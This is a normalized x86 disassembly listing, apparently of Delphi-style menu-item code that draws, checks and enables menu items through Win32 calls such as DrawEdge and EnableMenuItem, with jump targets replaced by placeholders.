mov edx [ ebp + 0x8 ]
mov [ edx - 0x48 ] eax
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x28 ]
mov eax [ eax + 0xc ]
mov edx 0xff000012
call sub_41d400
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x4c ]
push eax
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x4c ]
mov edx [ eax ]
call [ edx + 0x20 ]
mov edx [ ebp + 0x8 ]
mov edx [ edx - 0x4 ]
mov ecx [ ebp + 0x8 ]
mov esi [ ecx - 0xc ]
sub edx esi
sub edx eax
sar edx 0x1
jns r-xdata
mov eax [ ebp + 0x8 ]
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x40 ]
call sub_44b524
cmp ebx eax
jge r-xdata
mov eax [ ebp + 0x8 ]
mov edx [ eax - 0x48 ]
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x28 ]
mov eax [ eax + 0x14 ]
call sub_41dbec
mov eax [ ebp + 0x8 ]
dec [ eax - 0x8 ]
mov eax [ ebp + 0x8 ]
inc [ eax - 0xc ]
mov eax [ ebp + 0x8 ]
mov [ eax - 0x39 ] 0x0
mov eax [ ebp + 0x8 ]
add eax 0xffffffe0
push eax
mov eax [ ebp + 0x8 ]
mov al [ eax - 0x29 ]
push eax
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x64 ]
or eax 0x400
or eax 0x100
push eax
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x38 ]
mov ecx [ eax + 0x30 ]
mov eax [ ebp + 0x8 ]
mov edx [ eax - 0x28 ]
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x38 ]
call sub_44e738
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x5c ]
mov edx [ ebp + 0x8 ]
mov [ edx - 0x20 ] eax
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x54 ]
mov edx [ ebp + 0x8 ]
mov [ edx - 0x18 ] eax
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x50 ]
mov edx [ ebp + 0x8 ]
sub eax [ edx - 0x58 ]
mov edx [ ebp + 0x8 ]
mov edx [ edx - 0x14 ]
mov ecx [ ebp + 0x8 ]
sub edx [ ecx - 0x1c ]
sub eax edx
sar eax 0x1
jns r-xdata
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x28 ]
mov eax [ eax + 0xc ]
mov dl [ r-xdata ]
call sub_41d6cc
mov eax [ ebp + 0x8 ]
or [ eax - 0x64 ] 0x100000
mov eax [ ebp + 0x8 ]
test [ eax + 0xc ] 0x40
je r-xdata
push 0xf
push 0x2
mov eax [ ebp + 0x8 ]
add eax 0xffffffe0
push eax
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x28 ]
call sub_41e4e4
push eax
call DrawEdge
jmp r-xdata
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x38 ]
mov ecx [ eax + 0x4c ]
mov eax [ ebp + 0x8 ]
lea edx [ eax - 0x10 ]
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x28 ]
call sub_41e148
mov eax [ ebp + 0x8 ]
mov edx [ ebp + 0x8 ]
lea esi [ eax - 0x5c ]
lea edi [ edx - 0x10 ]
movsd [ edi ] [ esi ]
movsd [ edi ] [ esi ]
movsd [ edi ] [ esi ]
movsd [ edi ] [ esi ]
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x38 ]
mov eax [ eax + 0x4c ]
mov edx [ eax ]
call [ edx + 0x20 ]
mov edx [ ebp + 0x8 ]
mov edx [ edx - 0x4 ]
mov ecx [ ebp + 0x8 ]
sub edx [ ecx - 0xc ]
sub edx eax
sar edx 0x1
jns r-xdata
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x8 ]
sub eax edx
inc eax
mov edx [ ebp + 0x8 ]
mov [ edx - 0x8 ] eax
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x38 ]
mov eax [ eax + 0x4c ]
mov edx [ eax ]
call [ edx + 0x2c ]
mov edx [ ebp + 0x8 ]
mov edx [ edx - 0x8 ]
sub edx eax
mov eax [ ebp + 0x8 ]
mov [ eax - 0x10 ] edx
adc edx 0x0
mov eax [ ebp + 0x8 ]
add edx esi
inc edx
push edx
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x4c ]
mov edx [ eax ]
call [ edx + 0x2c ]
mov edx [ ebp + 0x8 ]
mov edx [ edx - 0x8 ]
mov ecx [ ebp + 0x8 ]
mov ebx [ ecx - 0x10 ]
sub edx ebx
sub edx eax
sar edx 0x1
jns r-xdata
adc edx 0x0
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0xc ]
push eax
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x38 ]
mov eax [ eax + 0x40 ]
push eax
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x38 ]
mov al [ eax + 0x39 ]
push eax
mov eax [ ebp + 0x8 ]
mov ecx [ eax - 0x10 ]
mov eax [ ebp + 0x8 ]
mov edx [ eax - 0x28 ]
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x40 ]
call sub_44ba3c
jmp r-xdata
push eax
push 0x0
mov eax [ ebp + 0x8 ]
add eax 0xffffffe0
push eax
call OffsetRect
mov eax [ ebp + 0x8 ]
cmp [ eax + 0x8 ] 0x0
je r-xdata
adc eax 0x0
mov eax [ ebp + 0x8 ]
cmp [ eax - 0x29 ] 0x0
jne r-xdata
push 0xf
push 0x4
mov eax [ ebp + 0x8 ]
add eax 0xffffffe0
push eax
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x28 ]
call sub_41e4e4
push eax
call DrawEdge
mov eax [ ebp + 0x8 ]
dec [ eax - 0x8 ]
mov eax [ ebp + 0x8 ]
dec [ eax - 0x4 ]
jmp r-xdata
mov eax [ ebp + 0x8 ]
add edx [ eax - 0xc ]
inc edx
mov eax [ ebp + 0x8 ]
mov [ eax - 0xc ] edx
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x38 ]
mov eax [ eax + 0x4c ]
mov edx [ eax ]
call [ edx + 0x20 ]
mov edx [ ebp + 0x8 ]
add eax [ edx - 0xc ]
mov edx [ ebp + 0x8 ]
mov [ edx - 0x4 ] eax
adc edx 0x0
mov eax [ ebp + 0x8 ]
add edx ebx
inc edx
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x28 ]
pop ecx
call sub_41dee4
mov eax [ ebp + 0x8 ]
mov edx [ eax - 0x48 ]
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x28 ]
mov eax [ eax + 0xc ]
call sub_41d400
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push r-xdata
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x4c ]
call sub_4032a0
retn
adc edx 0x0
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x38 ]
cmp [ eax + 0x38 ] 0x0
je r-xdata
mov eax [ ebp + 0x8 ]
add eax 0xffffffe0
push eax
mov eax [ ebp + 0x8 ]
mov al [ eax - 0x29 ]
push eax
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x64 ]
push eax
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x38 ]
mov ecx [ eax + 0x30 ]
mov eax [ ebp + 0x8 ]
mov edx [ eax - 0x28 ]
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x38 ]
call sub_44e738
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x38 ]
mov bx [ eax + 0x60 ]
test bx bx
je r-xdata
mov eax [ ebp + 0x8 ]
cmp [ eax - 0x29 ] 0x0
je r-xdata
push 0xffffffff
push 0x0
mov eax [ ebp + 0x8 ]
add eax 0xffffffe0
push eax
call OffsetRect
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_44fb9f
lea eax [ ebp - 0x4 ]
call sub_404074
retn
mov eax [ ebp + 0x8 ]
cmp [ eax + 0x8 ] 0x0
jne r-xdata
mov eax [ ebp + 0x8 ]
cmp [ eax - 0x5d ] 0x0
je r-xdata
lea edx [ ebp - 0x4 ]
mov eax [ ebp + 0x8 ]
mov eax ebx
call sub_44d7fc
mov eax [ ebp + 0x8 ]
mov [ eax - 0x20 ] 0xa
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x28 ]
mov edx [ ebp - 0x4 ]
call sub_41e320
mov edx [ ebp + 0x8 ]
add eax [ edx - 0x20 ]
mov edx [ ebp + 0x8 ]
mov [ edx - 0x18 ] eax
mov eax [ ebp + 0x8 ]
add eax 0xffffffe0
push eax
mov eax [ ebp + 0x8 ]
mov al [ eax - 0x29 ]
push eax
push 0x2
mov eax [ ebp + 0x8 ]
mov edx [ eax - 0x28 ]
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x38 ]
mov ecx [ ebp - 0x4 ]
call sub_44e738
push 0x0
push 0x1
mov eax [ ebp + 0x8 ]
add eax 0xffffffe0
push eax
call OffsetRect
sub_44fcec
push ebx
xor ebx ebx
mov edx [ eax + 0x64 ]
jmp r-xdata
test edx edx
je r-xdata
test edx edx
je r-xdata
cmp [ edx + 0x7c ] 0x0
je r-xdata
call sub_4506d0
test eax eax
je r-xdata
mov ebx [ edx + 0x7c ]
jmp r-xdata
mov edx [ edx + 0x64 ]
mov eax ebx
pop ebx
retn
mov ebx [ eax + 0x48 ]
sub_44fd1c
push ebp
mov ebp esp
add esp 0xfffffeac
mov [ ebp - 0x154 ] 0x154
push 0x0
lea eax [ ebp - 0x154 ]
push eax
push 0x0
push 0x29
call SystemParametersInfoA
test eax eax
je r-xdata
mov esp ebp
pop ebp
retn
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x4 ]
mov edx [ ebp - 0xbc ]
mov [ eax ] edx
mov eax [ ebp + 0x8 ]
mov eax [ eax + 0x8 ]
mov edx [ ebp - 0xb8 ]
mov [ eax ] edx
sub_44fd68
push ebp
mov ebp esp
add esp 0xffffffdc
push ebx
push esi
push edi
xor ebx ebx
mov [ ebp - 0x24 ] ebx
mov [ ebp - 0x10 ] ebx
mov [ ebp - 0x4 ] ecx
mov [ ebp - 0x8 ] edx
mov edi eax
xor eax eax
push ebp
push sub_44ff4a
push [ fs : eax ]
mov [ fs : eax ] esp
mov eax edi
mov si 0xfff2
call sub_40349c
mov edx [ r-xdata ]
call sub_40342c
test al al
je r-xdata
xor ebx ebx
mov bl 0x1
push ebp
call sub_44fd1c
pop ecx
jmp r-xdata
cmp [ ebp - 0xc ] 0x0
je r-xdata
mov eax [ ebp + 0x8 ]
mov [ eax ] 0x5
mov eax [ ebp - 0x4 ]
mov [ eax ] 0xfffffffe
xor eax eax
jmp r-xdata
mov eax edi
call sub_4506d0
mov esi eax
mov eax edi
call sub_44fcec
mov [ ebp - 0xc ] eax
mov eax [ edi + 0x30 ]
mov edx r-xdata
call sub_404480
jne r-xdata
cmp [ edi + 0x4c ] 0x0
je r-xdata
cmp [ edi + 0x40 ] 0xffffffff
jg r-xdata
test al al
je r-xdata
mov eax [ ebp - 0x4 ]
mov [ eax ] 0xfffffff9
xor eax eax
mov eax [ edi + 0x4c ]
mov edx [ eax ]
call [ edx + 0x1c ]
test al al
jne r-xdata
mov eax [ ebp - 0xc ]
mov eax [ eax + 0x34 ]
mov edx [ ebp - 0x4 ]
mov [ edx ] eax
test bl bl
jne r-xdata
test bl bl
jne r-xdata
test bl bl
jne r-xdata
test bl bl
jne r-xdata
mov eax [ ebp - 0x4 ]
mov [ eax ] 0x10
test bl bl
jne r-xdata
mov al 0x1
jmp r-xdata
mov eax [ ebp - 0xc ]
mov eax [ eax + 0x30 ]
mov edx [ ebp + 0x8 ]
mov [ edx ] eax
lea eax [ ebp - 0x20 ]
xor ecx ecx
mov edx 0x10
call sub_402cbc
test esi esi
je r-xdata
mov eax [ ebp + 0x8 ]
add [ eax ] 0x3
mov eax [ ebp - 0x4 ]
add [ eax ] 0xf
mov al 0x1
jmp r-xdata
mov eax [ ebp + 0x8 ]
mov [ eax ] 0x10
mov eax esi
mov edx [ r-xdata ]
call sub_40342c
test al al
je r-xdata
xor ebx ebx
jmp r-xdata
xor ebx ebx
mov bl [ esi + 0x60 ]
jmp r-xdata
mov si [ edi + 0x60 ]
test si si
je r-xdata
lea eax [ ebp - 0x10 ]
mov edx [ edi + 0x30 ]
call sub_40410c
lea edx [ ebp - 0x24 ]
mov eax esi
call sub_44d7fc
mov ecx [ ebp - 0x24 ]
lea eax [ ebp - 0x10 ]
mov edx [ edi + 0x30 ]
call sub_404380
jmp r-xdata
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_44ff51
lea eax [ ebp - 0x24 ]
call sub_404074
lea eax [ ebp - 0x10 ]
call sub_404074
retn
mov eax [ ebp - 0x4 ]
push eax
mov eax [ ebp + 0x8 ]
push eax
mov ecx [ ebp - 0x8 ]
mov edx edi
mov eax [ edi + 0xa4 ]
call [ edi + 0xa0 ]
xor eax eax
mov al bl
mov ax [ eax * 2 + rw-data ]
or ax 0x40
or ax 0x20
or ax 0x100
or ax 0x400
movzx eax ax
lea edx [ ebp - 0x20 ]
push edx
push 0x0
push eax
mov ecx [ ebp - 0x10 ]
mov edx [ ebp - 0x8 ]
mov eax edi
call sub_44e738
mov eax [ ebp - 0x18 ]
sub eax [ ebp - 0x20 ]
add eax 0x7
mov edx [ ebp - 0x4 ]
add [ edx ] eax
cmp [ edi + 0xa2 ] 0x0
je r-xdata
sub_44ff7c
push ebx
push esi
mov esi edx
mov ebx eax
mov eax [ ebx + 0x30 ]
mov edx esi
call sub_404480
je r-xdata
pop esi
pop ebx
retn
lea eax [ ebx + 0x30 ]
mov edx esi
call sub_4040c8
mov dl 0x1
mov eax ebx
mov ecx [ eax ]
call [ ecx + 0x3c ]
sub_44ffa4
push ebx
push esi
push edi
mov ebx eax
mov esi [ ebx + 0x64 ]
test esi esi
je r-xdata
pop edi
pop esi
pop ebx
retn
mov eax esi
call sub_450114
dec eax
test eax eax
jl r-xdata
inc eax
mov esi eax
xor edi edi
inc edi
dec esi
jne r-xdata
cmp [ eax + 0x3d ] 0x0
je r-xdata
mov edx edi
mov eax [ ebx + 0x64 ]
call sub_450124
cmp ebx eax
je r-xdata
mov dl [ eax + 0x3f ]
cmp dl [ ebx + 0x3f ]
jne r-xdata
xor edx edx
call sub_44ffec
sub_44ffec
push ebx
push esi
push edi
mov ebx edx
mov esi eax
cmp bl [ esi + 0x38 ]
je r-xdata
pop edi
pop esi
pop ebx
retn
mov [ esi + 0x38 ] bl
mov edi [ esi + 0x64 ]
test edi edi
je r-xdata
test bl bl
je r-xdata
test [ esi + 0x1c ] 0x2
jne r-xdata
cmp [ esi + 0x3d ] 0x0
je r-xdata
xor eax eax
mov al bl
mov eax [ eax * 4 + rw-data ]
or eax 0x0
push eax
movzx eax [ esi + 0x50 ]
push eax
mov eax edi
call sub_44e6a8
push eax
call CheckMenuItem
mov eax esi
call sub_44ffa4
sub_450040
push ebx
push esi
push edi
mov ebx edx
mov esi eax
cmp bl [ esi + 0x39 ]
je r-xdata
pop edi
pop esi
pop ebx
retn
mov [ esi + 0x39 ] bl
mov eax [ rw-data ]
cmp [ eax ] 0x2
jne r-xdata
mov edi [ esi + 0x64 ]
test edi edi
je r-xdata
mov eax esi
call sub_450114
test eax eax
jne r-xdata
mov edi [ esi + 0x64 ]
test edi edi
je r-xdata
cmp [ edi + 0x6c ] 0x0
je r-xdata
mov dl 0x1
mov eax esi
mov ecx [ eax ]
call [ ecx + 0x3c ]
jmp r-xdata
xor edx edx
mov eax esi
mov ecx [ eax ]
call [ ecx + 0x3c ]
test [ esi + 0x1c ] 0x2
jne r-xdata
xor eax eax
mov al bl
mov eax [ eax * 4 + rw-data ]
or eax 0x0
push eax
movzx eax [ esi + 0x50 ]
push eax
mov eax edi
call sub_44e6a8
push eax
call EnableMenuItem
sub_4500b8
push ebx
push esi
push edi
mov ebx edx
mov esi eax
cmp bl [ esi + 0x3f ]
je r-xdata
pop edi
pop esi
pop ebx
retn
mov edi [ esi + 0x64 ]
test edi edi
je r-xdata
mov [ esi + 0x3f ] bl
cmp [ esi + 0x38 ] 0x0
je r-xdata
mov edx esi
mov eax edi
call sub_450478
mov edx eax
mov ecx ebx
mov eax edi
call sub_44e648
cmp [ esi + 0x3d ] 0x0
je r-xdata
mov eax esi
call sub_44ffa4
sub_450124
push ebx
push esi
mov esi edx
mov ebx eax
cmp [ ebx + 0x5c ] 0x0
jne r-xdata
mov edx esi
mov eax [ ebx + 0x5c ]
call sub_413de4
pop esi
pop ebx
retn
mov eax [ rw-data ]
call sub_44d750
sub_450194
push ebx
push esi
push edi
mov esi edx
mov ebx eax
mov eax [ ebx + 0x64 ]
test eax eax
je r-xdata
pop edi
pop esi
pop ebx
retn
call sub_450114
test esi esi
jge r-xdata
cmp eax esi
jg r-xdata
xor esi esi
mov eax ebx
call sub_45017c
cmp esi eax
je r-xdata
mov esi eax
dec esi
mov edi [ ebx + 0x64 ]
mov edx ebx
mov eax edi
call sub_4504ac
mov ecx ebx
mov edx esi
mov eax edi
call sub_4502a0
sub_4501dc
push ebp
mov ebp esp
push ecx
push ebx
push esi
mov [ ebp - 0x4 ] eax
mov eax [ ebp - 0x4 ]
call sub_450114
mov ebx eax
dec ebx
test ebx ebx
jl r-xdata
pop esi
pop ebx
pop ecx
pop ebp
retn 0x8
inc ebx
xor esi esi
mov edx esi
mov eax [ ebp - 0x4 ]
call sub_450124
mov edx eax
mov eax [ ebp + 0xc ]
call [ ebp + 0x8 ]
inc esi
dec ebx
jne r-xdata
sub_450234
push ebx
push esi
push edi
push ebp
mov ebx edx
mov ebp eax
cmp bl [ ebp + 0x3a ]
je r-xdata
pop ebp
pop edi
pop esi
pop ebx
retn
test bl bl
je r-xdata
mov [ ebp + 0x3a ] bl
mov dl 0x1
mov eax ebp
mov ecx [ eax ]
call [ ecx + 0x3c ]
cmp [ ebp + 0x64 ] 0x0
je r-xdata
mov eax [ ebp + 0x64 ]
call sub_450114
mov edi eax
dec edi
test edi edi
jl r-xdata
inc edi
xor esi esi
inc esi
dec edi
jne r-xdata
mov edx esi
mov eax [ ebp + 0x64 ]
call sub_450124
mov [ eax + 0x3a ] 0x0
mov edx esi
mov eax [ ebp + 0x64 ]
call sub_450124
cmp [ eax + 0x3a ] 0x0
je r-xdata
sub_4502a0
push ebx
push esi
push edi
push ebp
mov esi ecx
mov edi edx
mov ebx eax
cmp [ esi + 0x64 ] 0x0
je r-xdata
cmp [ ebx + 0x5c ] 0x0
jne r-xdata
mov eax [ rw-data ]
call sub_44d750
mov ebp edi
dec ebp
test ebp ebp
jl r-xdata
mov dl 0x1
mov eax [ r-xdata ]
call sub_403270
mov [ ebx + 0x5c ] eax
mov cl [ esi + 0x3f ]
mov edx edi
mov eax ebx
call sub_44e648
mov ecx esi
mov edx edi
mov eax [ ebx + 0x5c ]
call sub_413e60
mov [ esi + 0x64 ] ebx
mov [ esi + 0x84 ] ebx
mov [ esi + 0x80 ] sub_450518
cmp [ ebx + 0x34 ] 0x0
je r-xdata
mov eax [ ebx + 0x5c ]
cmp ebp [ eax + 0x8 ]
jge r-xdata
mov eax ebx
call sub_450114
dec eax
sete dl
mov eax ebx
mov ecx [ eax ]
call [ ecx + 0x3c ]
pop ebp
pop edi
pop esi
pop ebx
retn
mov eax ebx
call sub_44e578
mov edx ebp
mov eax [ ebx + 0x5c ]
call sub_413de4
mov al [ eax + 0x3f ]
cmp al [ esi + 0x3f ]
jbe r-xdata
mov edx ebp
mov eax [ ebx + 0x5c ]
call sub_413de4
mov dl [ eax + 0x3f ]
mov eax esi
call sub_4500b8
sub_450354
push ebx
push esi
push edi
mov esi edx
mov ebx eax
test esi esi
jl r-xdata
mov eax [ rw-data ]
call sub_44d750
cmp [ ebx + 0x5c ] 0x0
je r-xdata
mov eax ebx
call sub_450114
test eax eax
sete dl
mov eax ebx
mov ecx [ eax ]
call [ ecx + 0x3c ]
pop edi
pop esi
pop ebx
retn
mov eax ebx
call sub_44e578
mov eax ebx
call sub_450114
cmp esi eax
jl r-xdata
mov edx esi
mov eax [ ebx + 0x5c ]
call sub_413de4
mov edi eax
mov edx esi
mov eax [ ebx + 0x5c ]
call sub_413cd4
xor eax eax
mov [ edi + 0x64 ] eax
xor eax eax
mov [ edi + 0x80 ] eax
mov [ edi + 0x84 ] eax
cmp [ ebx + 0x34 ] 0x0
je r-xdata
sub_4503c8
push ebx
push esi
mov ebx eax
cmp [ ebx + 0x39 ] 0x0
je r-xdata
pop esi
pop ebx
retn
cmp [ ebx + 0x44 ] 0x0
jne r-xdata
mov esi [ ebx + 0x44 ]
test esi esi
je r-xdata
cmp [ ebx + 0xa8 ] 0x0
jne r-xdata
cmp [ ebx + 0x8a ] 0x0
je r-xdata
mov eax esi
mov edx [ eax ]
call [ edx + 0x78 ]
test al al
jne r-xdata
mov dl [ ebx + 0x38 ]
xor dl 0x1
mov eax ebx
call sub_44ffec
test [ ebx + 0x1c ] 0x10
jne r-xdata
mov eax ebx
call sub_4500fc
test eax eax
je r-xdata
cmp [ ebx + 0xa8 ] 0x0
je r-xdata
cmp [ ebx + 0x8a ] 0x0
je r-xdata
cmp [ ebx + 0x44 ] 0x0
je r-xdata
mov eax ebx
call sub_4500fc
mov eax [ eax + 0x40 ]
cmp eax [ ebx + 0x88 ]
je r-xdata
mov edx ebx
mov eax [ ebx + 0x8c ]
call [ ebx + 0x88 ]
mov edx ebx
mov eax [ ebx + 0x44 ]
mov ecx [ eax ]
call [ ecx + 0x18 ]
jmp r-xdata
mov edx ebx
mov eax [ ebx + 0x8c ]
call [ ebx + 0x88 ]
jmp r-xdata
sub_450490
push ebx
push esi
mov esi edx
mov ebx eax
mov eax ebx
call sub_450114
mov edx eax
mov ecx esi
mov eax ebx
call sub_4502a0
pop esi
pop ebx
retn
sub_4504ac
push ebx
push esi
mov ebx eax
mov eax ebx
call sub_450478
mov esi eax
cmp esi 0xffffffff
jne r-xdata
mov edx esi
mov eax ebx
call sub_450354
pop esi
pop ebx
retn
mov eax [ rw-data ]
call sub_44d750
sub_4504d4
push ebx
push esi
mov ebx edx
mov esi eax
cmp [ esi + 0x64 ] 0x0
jne r-xdata
mov eax esi
mov eax [ esi + 0x4 ]
mov edx [ r-xdata ]
call sub_40342c
test al al
je r-xdata
pop esi
pop ebx
retn
push ebx
mov ecx eax
mov edx esi
mov eax [ esi + 0x84 ]
call [ esi + 0x80 ]
xor eax eax
jmp r-xdata
cmp [ esi + 0x82 ] 0x0
je r-xdata
sub_450518
push ebp
mov ebp esp
push ebx
push esi
mov esi ecx
mov ebx eax
cmp [ ebp + 0x8 ] 0x0
je r-xdata
mov eax [ ebx + 0x64 ]
test eax eax
je r-xdata
cmp [ ebx + 0x34 ] 0x0
jne r-xdata
mov esi [ ebx + 0x4 ]
mov eax esi
mov edx [ r-xdata ]
call sub_40342c
test al al
je r-xdata
push 0x0
mov ecx esi
mov edx ebx
call sub_450518
jmp r-xdata
mov eax ebx
call sub_44e578
cmp [ ebx + 0x6c ] 0x0
je r-xdata
pop esi
pop ebx
pop ebp
retn 0x4
mov eax esi
call sub_4521f0
sub_450570
push ebx
mov ebx eax
cmp [ ebx + 0x4c ] 0x0
jne r-xdata
mov dl 0x1
mov eax [ ebx + 0x4c ]
mov ecx [ eax ]
call [ ecx + 0x3c ]
mov eax [ ebx + 0x4c ]
pop ebx
retn
mov dl 0x1
mov eax [ r-xdata ]
call sub_4220b0
mov [ ebx + 0x4c ] eax
sub_450598
push ebx
push esi
push edi
mov edi edx
mov ebx eax
test edi edi
jne r-xdata
cmp [ ebx + 0x44 ] 0x0
jne r-xdata
mov eax [ ebx + 0x44 ]
call sub_4032a0
xor eax eax
mov [ ebx + 0x44 ] eax
jmp r-xdata
mov edx edi
mov eax [ ebx + 0x44 ]
mov ecx [ eax ]
call [ ecx + 0xc ]
mov eax [ ebx + 0x44 ]
mov [ eax + 0xc ] ebx
mov [ eax + 0x8 ] sub_45082c
test [ edi + 0x1c ] 0x1
setne cl
mov edx edi
mov eax ebx
mov si 0xffef
call sub_40349c
mov edx ebx
mov eax edi
call sub_41a1b4
mov eax ebx
mov si 0xffee
call sub_40349c
mov ecx ebx
mov dl 0x1
call [ eax + 0x14 ]
mov [ ebx + 0x44 ] eax
pop edi
pop esi
pop ebx
retn
sub_450608
push ebx
push esi
mov ebx edx
mov esi eax
cmp [ esi + 0x4c ] 0x0
jne r-xdata
mov edx ebx
mov eax [ esi + 0x4c ]
mov ecx [ eax ]
call [ ecx + 0x8 ]
mov dl 0x1
mov eax esi
mov ecx [ eax ]
call [ ecx + 0x3c ]
pop esi
pop ebx
retn
mov dl 0x1
mov eax [ r-xdata ]
call sub_4220b0
mov [ esi + 0x4c ] eax
sub_45063c
push ebx
push esi
push edi
mov edi eax
mov eax edi
call sub_450114
mov ebx eax
dec ebx
test ebx ebx
jl r-xdata
pop edi
pop esi
pop ebx
retn
inc ebx
xor esi esi
mov edx esi
mov eax edi
call sub_450124
mov edx [ eax ]
call [ edx + 0x40 ]
inc esi
dec ebx
jne r-xdata
sub_45067c
push ebx
push esi
mov esi edx
mov ebx eax
mov eax [ ebx + 0x64 ]
test eax eax
je r-xdata
test esi esi
je r-xdata
mov edx ebx
call sub_4504ac
pop esi
pop ebx
retn
mov eax esi
mov edx [ r-xdata ]
call sub_40342c
test al al
je r-xdata
mov eax esi
mov edx [ r-xdata ]
call sub_40342c
test al al
je r-xdata
mov eax [ esi + 0x34 ]
mov edx ebx
call sub_450490
jmp r-xdata
mov edx ebx
mov eax esi
call sub_450490
sub_4506e0
push ebx
mov ebx eax
cmp dl [ ebx + 0x3d ]
je r-xdata
pop ebx
retn
mov [ ebx + 0x3d ] dl
cmp [ ebx + 0x38 ] 0x0
je r-xdata
mov dl 0x1
mov eax ebx
mov ecx [ eax ]
call [ ecx + 0x3c ]
cmp [ ebx + 0x3d ] 0x0
je r-xdata
mov eax ebx
call sub_44ffa4
sub_45070c
push ebx
push esi
push edi
mov ebx ecx
mov edi edx
mov esi eax
mov eax edi
mov edx [ r-xdata ]
call sub_40342c
test al al
je r-xdata
pop edi
pop esi
pop ebx
retn
test bl bl
je r-xdata
mov al [ edi + 0x95 ]
mov [ esi + 0xa8 ] al
cmp [ esi + 0xa8 ] 0x0
jne r-xdata
mov edx [ edi + 0x64 ]
mov eax esi
call sub_44ff7c
cmp [ esi + 0x30 ] 0x0
jne r-xdata
test bl bl
je r-xdata
mov dl [ edi + 0x69 ]
mov eax esi
call sub_44ffec
cmp [ esi + 0x38 ] 0x0
jne r-xdata
test bl bl
je r-xdata
mov dl [ edi + 0x6a ]
mov eax esi
call sub_450040
cmp [ esi + 0x39 ] 0x1
jne r-xdata
test bl bl
je r-xdata
mov eax [ edi + 0x74 ]
mov [ esi + 0x54 ] eax
cmp [ esi + 0x54 ] 0x0
jne r-xdata
test bl bl
je r-xdata
lea eax [ esi + 0x58 ]
mov edx [ edi + 0x7c ]
call sub_4040c8
cmp [ esi + 0x58 ] 0x0
jne r-xdata
test bl bl
je r-xdata
test bl bl
je r-xdata
test bl bl
je r-xdata
cmp [ esi + 0x3d ] 0x0
je r-xdata
mov edx [ edi + 0x80 ]
mov eax esi
call sub_45016c
cmp [ esi + 0x40 ] 0xffffffff
jne r-xdata
mov dl [ edi + 0x6c ]
mov eax esi
call sub_4500b8
cmp [ esi + 0x3f ] 0x0
jne r-xdata
mov dx [ edi + 0x84 ]
mov eax esi
call sub_450148
cmp [ esi + 0x60 ] 0x0
jne r-xdata
test bl bl
je r-xdata
mov dl [ edi + 0x86 ]
mov eax esi
call sub_45015c
cmp [ esi + 0x3e ] 0x1
jne r-xdata
test bl bl
je r-xdata
mov eax [ edi + 0x40 ]
mov [ esi + 0x88 ] eax
mov eax [ edi + 0x44 ]
mov [ esi + 0x8c ] eax
cmp [ esi + 0x8a ] 0x0
jne r-xdata
test bl bl
je r-xdata
sub_45082c
push esi
push edi
mov edi edx
mov esi eax
mov eax esi
call sub_4500fc
cmp edi eax
jne r-xdata
pop edi
pop esi
retn
xor ecx ecx
mov edx edi
mov eax esi
mov si 0xffef
call sub_40349c
sub_450850
push ebx
push esi
mov ebx eax
mov esi [ ebx + 0x44 ]
test esi esi
je r-xdata
mov al 0x1
pop esi
pop ebx
retn
mov eax esi
mov edx [ eax ]
call [ edx + 0x20 ]
test al al
je r-xdata
xor eax eax
pop esi
pop ebx
retn
sub_450870
push ebx
push esi
mov ebx eax
mov esi [ ebx + 0x44 ]
test esi esi
je r-xdata
mov al 0x1
pop esi
pop ebx
retn
mov eax esi
mov edx [ eax ]
call [ edx + 0x24 ]
test al al
je r-xdata
xor eax eax
pop esi
pop ebx
retn
sub_450890
push ebx
push esi
mov ebx eax
mov esi [ ebx + 0x44 ]
test esi esi
je r-xdata
mov al 0x1
pop esi
pop ebx
retn
mov eax esi
mov edx [ eax ]
call [ edx + 0x28 ]
test al al
je r-xdata
xor eax eax
pop esi
pop ebx
retn
sub_4508b0
push ebx
push esi
mov ebx eax
mov esi [ ebx + 0x44 ]
test esi esi
je r-xdata
mov al 0x1
pop esi
pop ebx
retn
mov eax esi
mov edx [ eax ]
call [ edx + 0x38 ]
test al al
je r-xdata
xor eax eax
pop esi
pop ebx
retn
sub_4508d0
push ebx
push esi
mov ebx eax
mov esi [ ebx + 0x44 ]
test esi esi
je r-xdata
mov al 0x1
pop esi
pop ebx
retn
mov eax esi
mov edx [ eax ]
call [ edx + 0x30 ]
test al al
je r-xdata
xor eax eax
pop esi
pop ebx
retn
sub_4508f0
push ebx
push esi
mov ebx eax
mov esi [ ebx + 0x44 ]
test esi esi
je r-xdata
mov al 0x1
pop esi
pop ebx
retn
mov eax esi
mov edx [ eax ]
call [ edx + 0x3c ]
